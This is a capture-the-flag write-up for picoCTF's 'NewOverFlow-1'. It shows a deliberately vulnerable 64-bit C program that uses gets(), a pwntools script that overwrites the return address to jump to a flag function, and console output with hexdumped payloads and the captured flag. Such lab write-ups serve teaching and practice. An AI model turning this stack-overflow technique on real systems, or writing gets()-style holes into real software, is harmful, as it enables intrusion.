# NewOverFlow-1
Binary Exploitation, 200 points

## Description:
> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}


```


## Solution:

(Initial commit with just the script)

```python
# First, generate a pwntools template using:
# pwn template --host 2019shell1.picoctf.com --user dvdalt --path /problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

import os

if shell is not None:
    shell.set_working_directory(os.path.dirname(remote_path))

def send_payload(proc, payload):
    proc.sendlineafter("Welcome to 64-bit. Give me a string that gets you the flag: ", payload)


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm core.* > /dev/null")
    proc = process(exe.path)
    payload = cyclic(200, n = exe.bytes)
    send_payload(proc, payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.fault_addr, n = exe.bytes )
    log.info("Overflow offset: {} ({}-byte architecture)".format(offset, exe.bytes))
    return offset


overflow_offset = get_overflow_offset()
log.info("flag() address: {}".format(hex(exe.symbols["flag"])))

io = start()
payload = fit({overflow_offset: exe.symbols["main"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

payload = fit({overflow_offset: exe.symbols["flag"]}, filler = 'B')
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

print io.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/NewOverFlow-1# python exploit.py
[*] '/media/sf_CTFs/pico/NewOverFlow-1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Connecting to 2019shell1.picoctf.com on port 22: Done
[*] dvdalt@2019shell1.picoctf.com:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Opening new channel: 'pwd': Done
[+] Receiving all data: Done (13B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/tmp/tmp.6L3X1OVx47'
[+] Opening new channel: 'ln -s /home/dvdalt/* .': Done
[+] Receiving all data: Done (0B)
[*] Closed SSH channel with 2019shell1.picoctf.com
[*] Working directory: '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a'
[+] Starting local process '/media/sf_CTFs/pico/NewOverFlow-1/vuln': pid 840
[*] Process '/media/sf_CTFs/pico/NewOverFlow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 840)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/NewOverFlow-1/core.840'
    Arch:      amd64-64-little
    RIP:       0x4007e7
    RSP:       0x7ffcf64ed5f8
    Exe:       '/media/sf_CTFs/pico/NewOverFlow-1/vuln' (0x400000)
    Fault:     0x616161616161616a
[*] Overflow offset: 72 (8-byte architecture)
[*] flag() address: 0x400767
[+] Starting remote process '/problems/newoverflow-1_6_9968801986a228beb88aaad605c8d51a/vuln' on 2019shell1.picoctf.com: pid 322295
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  e8 07 40 00  00 00 00 00  │BBBB│BBBB│··@·│····│
    00000050
[*] Sending payload:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000040  42 42 42 42  42 42 42 42  67 07 40 00  00 00 00 00  │BBBB│BBBB│g·@·│····│
    00000050
[+] Receiving all data: Done (51B)
[*] Stopped remote process 'vuln' on 2019shell1.picoctf.com (pid 322295)

picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_d0b837aa}
```